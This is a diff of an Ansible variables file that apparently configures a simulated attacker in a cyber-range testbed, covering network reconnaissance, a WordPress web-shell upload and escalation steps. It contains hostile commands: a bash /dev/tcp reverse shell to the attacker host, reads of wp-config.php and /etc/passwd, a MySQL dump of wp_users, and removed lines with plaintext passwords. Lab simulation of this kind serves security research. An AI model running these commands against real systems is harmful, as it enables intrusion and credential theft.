@@ -16,8 +16,9 @@ kyoushi_files_owner: "{{ attacker.username }}"
 kyoushi_files_group: "{{ attacker.username }}"
 
 kyoushi_files_dir: "/home/{{ kyoushi_files_owner }}/files"
-kyoushi_files_glob: "files/**"
-kyoushi_files: "{{ query('fileglob', kyoushi_files_glob) }}"
+kyoushi_files:
+  - src: "{{ kyoushi_attacker_web_shell_image_src }}"
+    dest: "{{ kyoushi_attacker_web_shell_image }}"
 
 # cr cli config
 
@@ -32,11 +33,6 @@ kyoushi_statemachines_version: 0.3.2
 kyoushi_venv_python_version: 3.7
 kyoushi_user_name: "{{ attacker.username }}"
 kyoushi_user_group: "{{ attacker.username }}"
-
-# sm base config
-kyoushi_sm_errors: 1000
-#kyoushi_sm_start: 2021-01-20T9:00
-#kyoushi_sm_end: 2021-01-20T9:00
 
 # sm logging config
 
@@ -53,9 +49,10 @@ kyoushi_log_file:
   format: json
   path: "/var/log/kyoushi/{{ kyoushi_sm_effective_name }}/sm.log"
 
+
 # The idle configuration for the state machine
-kyoushi_sm_idle_big_min: 60
-kyoushi_sm_idle_big_max: 30
+kyoushi_sm_idle_big_min: 30
+kyoushi_sm_idle_big_max: 60
 kyoushi_sm_idle_medium_min: 20
 kyoushi_sm_idle_medium_max: 25
 kyoushi_sm_idle_small_min: 3.5
@@ -71,27 +68,25 @@ kyoushi_attacker_start: 0
 kyoushi_attacker_escalate_start: 0
 
 # The VPN connection config to use
-kyoushi_attacker_vpn: connection.ovpn
-kyoushi_attacker_vpn_src: "..."
+kyoushi_attacker_vpn: "/home/{{ attacker.username }}/.openvpn/stolen.ovpn"
 
 # Recon phase config
 # The host to traceroute to
 kyoushi_attacker_recon_trace: "{{ openstack.addresses.internet[0].addr }}" # trace to the attacker host itself
 # The DMZ network to scan
-kyoushi_attacker_recon_dmz: 172.16.100.0/24
+kyoushi_attacker_recon_dmz: "{{ firewall_cidrs.dmz }}"
 # The intranet network to scan
-kyoushi_attacker_recon_intranet: 172.16.0.0/24
+kyoushi_attacker_recon_intranet: "{{ firewall_cidrs.lan }}"
 # The DNS server to target during the domain scan
-kyoushi_attacker_recon_dns: 172.16.100.1
+kyoushi_attacker_recon_dns: "{{ hostvars['inet-firewall'].openstack.addresses.dmz[0].addr }}"
 # The domain to brute force
-kyoushi_attacker_recon_domain: company.cyberrange.at
+kyoushi_attacker_recon_domain: "{{ domains.company_external.domain }}"
 # The hosts to target for the service sca
 kyoushi_attacker_recon_hosts:
   - 172.16.0.254
 
 # The base URL for the wordpress instance
-kyoushi_attacker_wp_url: https://intranet.company.cyberrange.at
-
+kyoushi_attacker_wp_url: "https://{{ hostvars['intranet_server'].wp_apache_hostname }}"
 # The path to admin ajax endpoint (without leading slash).
 #kyoushi_attacker_wp_admin_ajax: wp-admin/admin-ajax.php
 
@@ -100,7 +95,8 @@ kyoushi_attacker_wp_url: https://intranet.company.cyberrange.at
 kyoushi_attacker_wp_dirb: []
 
 # The JPEG image to use to for the web shell upload exploit
-kyoushi_attacker_web_shell_image: empty.jpg
+kyoushi_attacker_web_shell_image: "{{ kyoushi_files_dir }}/special.jpg"
+kyoushi_attacker_web_shell_image_src: shell.jpg
   
 # The commands to execute via the web shell
 kyoushi_attacker_web_shell_commands:
@@ -114,10 +110,10 @@ kyoushi_attacker_web_shell_commands:
     cmd: ["ls", "-laR", "/var/www"]
     children:
       - name: "check_wp_config"
-        cmd: ["cat", "/var/www/intranet.company.cyberrange.at/wp-config.php"]
+        cmd: ["cat", "/var/www/{{ hostvars['intranet_server'].wp_apache_hostname }}/wp-config.php"]
         children:
           - name: "dump_wp_users"
-            cmd: ["mysql", "-u", "wordpress" ,"-ptainoox3aedeeSh", "wordpress_db", "-e", "'select * from wp_users'"]
+            cmd: ["mysql", "-u", "{{ hostvars['intranet_server'].wp_mysqldb_user }}" ,"-p{{ hostvars['intranet_server'].wp_mysqldb_password }}", "{{ hostvars['intranet_server'].wp_mysqldb_dbname }}", "-e", "'select * from wp_users'"]
   - name: "read_passwd"
     cmd: ["cat", "/etc/passwd"]
 
@@ -128,17 +124,17 @@ kyoushi_attacker_reverse_shell_host: "{{ openstack.addresses.internet[0].addr }}
 kyoushi_attacker_reverse_shell_port: 9999
 
 # The command to execute via the web shell to establish a reverse shell
-kyoushi_attacker_reverse_shell: [
-    "bash",
-    "-c",
-    "'0<&196;exec 196<>/dev/tcp/{{ kyoushi_attacker_reverse_shell_host }}/{{ kyoushi_attacker_reverse_shell_port }}; sh <&196 >&196 2>&196'",
-    "&",
-  ]
+kyoushi_attacker_reverse_shell:
+  - "bash"
+  - "-c"
+  # !!! Note that the leading white space must not be removed since Jinja2/Ansible will remove the surrounding single quotes if it is missing
+  - " '0<&196;exec 196<>/dev/tcp/{{ kyoushi_attacker_reverse_shell_host }}/{{ kyoushi_attacker_reverse_shell_port }}; sh <&196 >&196 2>&196'" 
+  - "&"
 
 # The user to escalate to in the 2nd part
-kyoushi_attacker_reverse_shell_user: ffeichtner
+kyoushi_attacker_reverse_shell_user: "{{ attack_shell_user.username }}"
 # The password to use for escalation
-kyoushi_attacker_reverse_shell_password: XrDVcwZx2k
+kyoushi_attacker_reverse_shell_password: "{{ attack_shell_user.password }}"
   
 # The commands to execute via the reverse shell
 kyoushi_attacker_reverse_shell_commands:
